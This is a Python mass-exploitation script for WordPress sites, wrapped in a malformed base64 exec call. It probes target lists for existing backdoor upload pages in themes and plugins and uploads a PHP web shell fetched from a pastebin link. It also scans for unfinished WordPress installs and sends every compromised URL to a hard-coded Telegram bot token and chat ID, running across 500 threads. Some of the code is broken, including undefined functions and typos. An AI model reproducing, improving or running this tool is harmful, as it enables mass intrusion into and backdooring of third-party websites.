
import base64
exec(base64.b64decode('#from distutils.command.upload import upload
from tabnanny import check
import requests
import os
import random
import sys
from re import findall as reg
from multiprocessing.dummy import Pool
import string
from random import choice, randint
from colorama import Fore
from colorama import Style
from colorama import init
init(autoreset=True)
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT
requests.urllib3.disable_warnings()

headers = {'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}

token = "5557259510:AAF-Wdx5MlhfIDs0I4YgoJ7_ZyaeqnVjlWY"
chatid = "1490947452"

def SendMsg(msg):
    requests.get('https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chatid+'&text='+msg)
    return

def upload_upl(shell) :
    try :
        ___hfgysazer___nbvxw__khljm = string.ascii_uppercase
        ______uytchdhjsqmd = randint(3,5)
        randoming = ''.join(choice(___hfgysazer___nbvxw__khljm) for i in range(______uytchdhjsqmd))
        link_upload_is_here = 'https://pastebin.com/raw/fehniMJX'
        code_source = requests.get(link_upload_is_here, timeout=10).text
        value____tytrtazewrsdytiyppng = 'utchiha-'+randoming+'.php'
        data_c = {'file':(value____tytrtazewrsdytiyppng,code_source)}
        data_g = {'_upl': 'Upload'}
        posting_again = requests.post(shell, verify=False, files=data_c, data=data_g)
        _____utchiha  = shell.replace('db.php?u', value____tytrtazewrsdytiyppng)
        ___sgqbw_______________ = requests.get(_____utchiha, timeout=10).text
        if 'input name="_upl" type="submit" id="_upl" value="Upload"' in ___sgqbw_______________ :
            print(fg+'Is uploaded =======>>'+_____utchiha)
            open('shelutchiha_saved.txt','a').write(_____utchiha+'\n')
            SendMsg(_____utchiha)

        else :
            replicing = _____utchiha.replace('themes','theme')
            checkingm = requests.get(replicing, timeout=10)
            if 'input name="_upl" type="submit" id="_upl" value="Upload"' in checkingm.text :
                print(fg+'uploaded   ==========>>>> '+replicing)
                open('shelutchiha_saved.txt','a').write(replicing+'\n')
                SendMsg(replicing)
            else:
                print('Not uploadedz   ====>>> '+replicing)
    except :
        pass
# ##############

def expp(shell) :
    try :
        ___hfgysazer___nbvxw__khljm = string.ascii_uppercase
        ______uytchdhjsqmd = randint(3,5)
        randoming = ''.join(choice(___hfgysazer___nbvxw__khljm) for i in range(______uytchdhjsqmd))
        link_upload_is_here = 'https://pastebin.com/raw/fehniMJX'
        code_source = requests.get(link_upload_is_here, timeout=10).text
        value____tytrtazewrsdytiyppng = 'utchiha-'+randoming+'.php'
        data_c = {'file':(value____tytrtazewrsdytiyppng,code_source)}
        data_g = {'_upl': 'Upload'}
        posting_again = requests.post(shell, verify=False, files=data_c, data=data_g)
        _____utchiha  = shell.replace('db.php?u', value____tytrtazewrsdytiyppng)
        ___sgqbw_______________ = requests.get(_____utchiha, timeout=10).text
        if 'input name="_upl" type="submit" id="_upl" value="Upload"' in ___sgqbw_______________ :
            print(fg+'Is uploaded =======>>'+_____utchiha)
            open('shelutchiha_saved.txt','a').write(_____utchiha+'\n')
            SendMsg(_____utchiha)
        else :
            repp = shell.replace('http://', 'https://')
            posting_again = requests.post(repp, verify=False, files=data_c, data=data_g)
            rping = repp.replace('db.php?u', value____tytrtazewrsdytiyppng)
            checinfds  = requests.get(rping, verify=False, timeout=10).text
            if 'input name="_upl" type="submit" id="_upl" value="Upload"' in checinfds :
                print(fg+'uploaded =======>>>>>  '+shell)
                open('shelutchiha_saved.txt','a').write(rping+'\n')
                SendMsg(rping)
            else :
                print('Not uploadedz   ====>>> '+rping)
    except :
        pass
###################
link_upload_is_here = 'https://pastebin.com/raw/fehniMJX'
def ________hgdyytqffswxcnmwlkqpoiuyty___HFGKSIODCJA___KJQHSGDFRTARZEW_____(shell):
    ___hfgysazer___nbvxw__khljm = string.ascii_uppercase
    ______uytchdhjsqmd = randint(3,5)
    randoming = ''.join(choice(___hfgysazer___nbvxw__khljm) for i in range(______uytchdhjsqmd))
    code_source = requests.get(link_upload_is_here, timeout=10).text
    value____tytrtazewrsdytiyppng = 'utchiha-'+randoming+'.php'
    data_a = {'f':(value____tytrtazewrsdytiyppng,code_source)}
    data_b = {'f[]':(value____tytrtazewrsdytiyppng,code_source)}
    data_c = {'file':(value____tytrtazewrsdytiyppng,code_source)}
    #data_azereazty = {'f':(value____tytrtazewrsdytiyppng,_hhgyudd_iuopabbw__wxcqdseart)}
    data_g = {'_upl': 'Upload'}
    fox_anon = {'a': 'BUbwxgj','p1': 'uploadFile','ne': '','charset': 'UTF-8'}
    data_wxcvccwxv = {'a': 'FilesMAn','p1': 'uploadFile','charset': 'Windows-1251'}
    try :
        swcxcqfatyyuspncjkl = requests.get(shell, timeout=10).text
        if '<<span>Upload file:' in swcxcqfatyyuspncjkl or 'type="submit" id="_upl" value="Upload">' in swcxcqfatyyuspncjkl or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in swcxcqfatyyuspncjkl or '>File Upload :<' in swcxcqfatyyuspncjkl :
            posting = requests.post(shell, files=data_c)
            split_shell = shell.split('/')[2]
            make_shell = 'http://'+split_shell+'/'+value____tytrtazewrsdytiyppng
            check_request = requests.get(make_shell, timeout=10).text
            if 'input name="_upl" type="submit" id="_upl" value="Upload"' in check_request :
                print('uploaded ==  '+make_shell)
                open('shells.txt','a').write(make_shell+'\n')
                SendMsg(make_shell)
                #wxccqggttqyuappododnbbcbbwq_____SQXWSARZEPJXN______mailersuploadfunction__gfq(make_shell)
            else :
                posting_again = requests.post(shell, files=data_a, data=data_wxcvccwxv)
                sp_shell = shell.split('/')[2]
                make_shells = 'http://'+sp_shell+'/'+value____tytrtazewrsdytiyppng
                checking = requests.get(make_shells, timeout=10).text
                if 'input name="_upl" type="submit" id="_upl" value="Upload"' in checking :
                    print('uploaded   ===  '+make_shells)
                    open('shells.txt','a').write(make_shells+'\n')
                    SendMsg(make_shells)
                    #wxccqggttqyuappododnbbcbbwq_____SQXWSARZEPJXN______mailersuploadfunction__gfq(make_shells)
                else :
                    ____hfgusdyst = requests.post(shell, files=data_b, data=fox_anon, timeout=10)
                    spl_utchiha = shell.split('/')[2]
                    mku = 'http://'+spl_utchiha+'/'+value____tytrtazewrsdytiyppng
                    checking_utchiha = requests.get(mku, timeout=10).text
                    if 'input name="_upl" type="submit" id="_upl" value="Upload"' in checking_utchiha :
                        print('uploaded  === '+mku)
                        open('shells.txt','a').write(mku+'\n')
                        SendMsg(mku)
                        #wxccqggttqyuappododnbbcbbwq_____SQXWSARZEPJXN______mailersuploadfunction__gfq(mku)
                    else :
                        __udyychhudi = requests.post(shell, files=data_b, data=fox_anon)
                        spp = shell.split('/')[2]
                        make_fox_utchiha = 'http://'+spp+'/'+value____tytrtazewrsdytiyppng
                        req = requests.get(make_fox_utchiha, timeout=10).text
                        if 'input name="_upl" type="submit" id="_upl" value="Upload"' in req :
                            print('uploaded == '+make_fox_utchiha)
                            open('shells.txt','a').write(make_fox_utchiha+'\n')
                            SendMsg(make_fox_utchiha)
                            #wxccqggttqyuappododnbbcbbwq_____SQXWSARZEPJXN______mailersuploadfunction__gfq(make_fox_utchiha)
                        else :
                            print(fr+'Not uploaded == '+shell)
        elif '<title>Vuln!! patch it Now!</title>' in swcxcqfatyyuspncjkl :
            if 'images' in shell :
                go  = requests.post(shell, files=data_c, data=data_g)
                spll = shell.splite('/')[2]
                ch_spll = 'http://'+spll+'/images/'+value____tytrtazewrsdytiyppng
                check_shell = requests.get(ch_spll, timeout=10).text
                if 'input name="_upl" type="submit" id="_upl" value="Upload"' in check_shell :
                    print('uploaded =   '+ch_spll)
                    open('shells.txt','a').write(ch_spll+'\n')
                    SendMsg(ch_spll)
                    #wxccqggttqyuappododnbbcbbwq_____SQXWSARZEPJXN______mailersuploadfunction__gfq(ch_spll)
            else :
                opses = requests.post(shell, files=data_c, data=data_g)
                self_split = shell.split('/')[2]
                maker = 'http://'+self_split+'/'+value____tytrtazewrsdytiyppng
                _hggfuty__iu = requests.get(maker, timeout=10).text
                if 'input name="_upl" type="submit" id="_upl" value="Upload"' in _hggfuty__iu :
                    print('uploaded  == '+maker)
                    open('shells.txt','a').write(maker+'\n')
                    SendMsg(maker)
                    #wxccqggttqyuappododnbbcbbwq_____SQXWSARZEPJXN______mailersuploadfunction__gfq(maker)
                else :
                    print('Not uploaded   '+shell)
    except :
        pass

def first(i) :
        shell  ='http://'+i+'/wp-content/themes/seotheme/db.php?u'
        req = requests.get(shell, timeout=10)
        if 'method="post" enctype="multipart/form-data" name="uploader" id="uploader"><input' in req.text :
            print('[Vuln_check] >>>> '+i)
            upload_upl(shell)
        else :
            shell = 'http://'+i+'/wp-content/theme/seotheme/db.php?u'
            requ  = requests.get(shell, verify=False, timeout=10)
            if 'method="post" enctype="multipart/form-data" name="uploader" id="uploader"><input' in requ.text :
                print('[Vuln_check] ====>>>> '+i)
                upload_upl(shell)
            else :
                print(fr+'[Not_vuln] ========>>>>  '+i)

def checking(i) :
    try :
        shell = 'http://'+i+'/wp-content/index.php?x=ooo'
        news = requests.get(shell, verify=False, headers=headers, timeout=25)
        if "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /><input type='submit' value='up' /></form>" in news.text :
            print('[exploited] =====>>>>>>  '+i)
            open('shells.txt','a').write(shell+'\n')
            SendMsg(shell)
        else :
            print(fr+'[Not_vuln]   =====>>> '+i)
    except :
        pass

def mar(i) :
    try:
        shell = 'http://'+i+'/wp-content/plugins/seoplugins/mar.php'
        prv = requests.get(shell, timeout=10)
        if ">public_html" in prv.text or "<span>Upload file:" in prv.text or 'type="submit" id="_upl" value="Upload">' in prv.text or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in prv.text or '>File Upload :<' in prv.text :
            print('[check_vuln]   ====>>> '+i)
            open('shells.txt','a').write(shell+'\n')
            SendMsg(shell)
            ________hgdyytqffswxcnmwlkqpoiuyty___HFGKSIODCJA___KJQHSGDFRTARZEW_____(shell)
        else :
            print(fr+'[Not_vuln] ========>>>>  '+i)
    except :
        pass
def uploader_exploit_utchiha(vulns) :
    ___hfgysazer___nbvxw__khljm = string.ascii_uppercase
    ______uytchdhjsqmd = randint(3,5)
    randoming = ''.join(choice(___hfgysazer___nbvxw__khljm) for i in range(______uytchdhjsqmd))
    link_upload_is_here = 'https://pastebin.com/raw/fehniMJX'
    code_source = requests.get(link_upload_is_here, timeout=10).text
    filezname = 'utchiha-'+randoming+'.php'
    filedata = {'l': './'}
    fileup = {'userfile': (filezname, code_source)}
    up = requests.post(vulns , data=filedata, files=fileup, headers=headers , verify=False, timeout=30)
    newShell = vulns.replace('IOptimize.php?rchk', filezname)
    check_shell = requests.get(newShell, headers=headers, verify=False, timeout=15).content
    if 'method="post" enctype="multipart/form-data" name="uploader"' in  check_shell:
        print('uploaded =====>>> '+newShell)
        open('shells.txt','a').write(newShell+'\n')
        SendMsg(newShell)
    else :
        print(fr+'fail uplaod =====>>>' + vulns)

def exploit_two(i) :
    try :
        shell = 'http://'+i+'/wp-content/plugins/seoplugins/db.php?u'
        py_check = requests.get(shell, verify=False, timeout=10)
        if '#0x2525<form action="" method="post"' in py_check.text :
            print('[Vuln check] ======>>> '+i)
            open('vuln.txt','a').write(shell+'\n')
            SendMsg(shell)
            expp(shell)
        else:
            print(fr+'Faill = ====>>>  '+i)
    except :
        pass

#new

def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def URLdomain(site):
    if 'http://' not in site and 'https://' not in site :
        site = 'http://'+site
    if site[-1]  != '/' :
        site = site+'/'
    return site

def domain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    if 'www.' in site :
        site = site.replace("www.", "")
    site = site.rstrip()
    if site.split('/') :
        site = site.split('/')[0]
    while site[-1] == "/":
        pattern = re.compile('(.*)/')
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def addWWW(site):
    if site.startswith("http://"):
        site = site.replace("http://", "http://www.")
    elif site.startswith("https://"):
        site = site.replace("https://", "https://www.")
    else :
        site = 'http://www.'+site
    return site

def exploit(url) :
#    print("running new exploit")
    try :
    #    dom = domain(url)
   #     url = URLdomain(url)
        if 'www.' in url:
            username = url.replace('www.', '')
        else:
            username = url
        if '.' in username:
            username = username.split('.')[0]
        if 'http://' in username:
            username = username.replace('http://', '')
        else:
            username = username.replace('https://', '')
        up=username.title()
        listdir = ["bk", "home", "wp", "cms", "wordpress", "backup-core","username", "wp1", "old1", "old_files", "123", "oldwebsite", "WP", "WordPress", "WORDPRESS","up", "blog", "new", "old", "Old", "demo", "sandbox", "backup", "Backup", "BACKUP", "test", "2020", "2019", "site","newsite", "Old","dev","copy","bkp","blogs","bkp2","old-site","old_core"]
        for directory in listdir:
            inj = url+directory
            check = requests.get(inj, headers=headers, verify=False, timeout=15).content
            if 'WordPress &rsaquo; Installation' in check :
                open('vuln.txt', 'a').write(url+directory +' \n')
                print (' -| ' + url + directory + '-->'+fg+'[Succefully]')
                SendMsg(url + directory)
                break
            elif 'WordPress &rsaquo; Setup Configuration File' in check :
                open('vuln.txt', 'a').write(url+directory  + '\n')
                SendMsg(url + directory)
                print (' -| ' + url + directory + '-->'+fg+'[Succefully]')
                break
            else :
                print (' -| ' + url + directory + '--> '+fr+'[Failed]')
    except :
        print (' -| ' + url + directory + '--> '+fr+'[Failed]')
        
#new end


def all(i) :
    first(i)
    checking(i)
    mar(i)
    checke(i)
    exploit_two(i)
    exploit(i)

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
    
    

utchiha = Pool(int(500))
utchiha.map(all, target)



'''def main() :
	    global token , chatid
	    if os.path.isfile('config.ini'):
	        configs = open('config.ini','r',errors='ignore').read()
	        token = reg('token = "(.*?)"',configs)[0]
	        chatid = reg('chatid = "(.*?)"',configs)[0]
	    else:
	        open('config.ini','a').write('token = ""\nchatid = ""')
        input('[!] Press Enter to exit!')
        exit()
        ''''))